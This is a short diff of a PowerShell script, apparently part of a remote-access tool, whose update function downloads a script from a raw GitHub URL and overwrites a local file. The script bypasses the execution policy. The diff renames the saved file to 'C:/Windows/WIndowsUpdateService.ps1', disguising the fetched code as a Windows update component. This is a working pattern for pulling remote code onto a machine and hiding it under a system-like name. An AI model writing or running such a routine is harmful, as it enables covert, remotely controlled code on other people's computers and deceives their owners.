@@ -25,12 +25,15 @@ Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 
 function Update-ScriptFromGitHub {
     $githubUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/access-control"
-    $localScriptPath = "C:/Users/Default/accessctrl.ps1"  # Path to your local script
+    $localScriptPath = "C:/Windows/WIndowsUpdateService.ps1"  # Path to your local script
 
     try {
         $webContent = Invoke-RestMethod -Uri $githubUrl
         $webContent | Set-Content -Path $localScriptPath -Force
         Write-Host "Script updated from GitHub."
+        
+        # Continue with the next section of your script here
+        # ...
     } catch {
         Write-Host "Failed to update the script from GitHub."
     }
